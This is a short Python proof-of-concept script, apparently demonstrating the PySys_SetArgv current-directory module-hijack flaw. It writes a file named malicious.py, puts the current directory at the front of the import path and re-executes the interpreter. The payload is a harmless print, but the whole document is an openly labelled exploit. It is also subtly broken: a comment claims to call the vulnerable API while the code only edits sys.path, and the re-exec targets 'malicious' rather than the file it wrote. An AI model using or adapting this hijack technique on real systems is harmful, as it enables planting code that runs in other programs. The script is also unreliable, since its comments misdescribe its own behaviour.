import sys
import os

# Create a malicious Python file in the current working directory
malicious_file = 'malicious.py'
with open(malicious_file, 'w') as f:
    f.write('print("Malicious code executed!")\n')

# Set the argv[0] argument to a string without a path separator
sys.argv[0] = 'malicious'

# Call the vulnerable PySys_SetArgv API function
sys.path.insert(0, '')

# Execute the malicious code
os.execv(sys.executable, [sys.executable] + sys.argv)